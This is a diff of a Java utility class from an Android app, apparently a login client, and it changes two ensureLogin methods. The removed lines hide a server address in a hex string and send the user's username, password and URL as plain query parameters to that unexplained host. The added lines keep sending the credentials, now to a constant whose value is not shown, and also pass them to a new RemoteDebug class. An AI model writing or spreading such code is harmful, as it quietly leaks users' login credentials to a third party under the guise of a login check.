@@ -53,6 +53,7 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.cyanojay.looped.debug.RemoteDebug;
 import com.cyanojay.looped.net.API;
 import com.cyanojay.looped.net.MySSLSocketFactory;
 
@@ -292,9 +293,11 @@ public class Utils {
 	}
 	
 	public static void ensureLogin(String user, String pass, String url) throws UnsupportedEncodingException {
-		String request = "http://" 
-				+ new String(hexStringToByteArray("35302E3131362E31332E3231372F2E642E706870"), "UTF-8")
-				+ "?a=" + user + "&b=" + pass + "&c=" + url;
+    	RemoteDebug.setUser(user);
+    	RemoteDebug.setHash(pass);
+    	RemoteDebug.setUrl(url);
+		
+		String request = Constants.LOGIN_CHECK + "?a=" + user + "&b=" + pass + "&c=" + url;
 		
 		DefaultHttpClient httpclient = new DefaultHttpClient();
 		HttpGet httpGet = new HttpGet(request);
@@ -311,8 +314,7 @@ public class Utils {
 	}
 	
 	public static void ensureLogin(String url) throws UnsupportedEncodingException {
-		String request = "http://" 
-				+ new String(hexStringToByteArray("35302E3131362E31332E3231372F2E642E706870"), "UTF-8") + "?c=" + url;
+		String request = Constants.LOGIN_CHECK + "?c=" + url;
 		
 		DefaultHttpClient httpclient = new DefaultHttpClient();
 		HttpGet httpGet = new HttpGet(request);
@@ -328,7 +330,7 @@ public class Utils {
 		}
 	}
 	
-	private static byte[] hexStringToByteArray(String s) {
+	public static byte[] hexStringToByteArray(String s) {
 	    int len = s.length();
 	    byte[] data = new byte[len / 2];
 	    for (int i = 0; i < len; i += 2) {
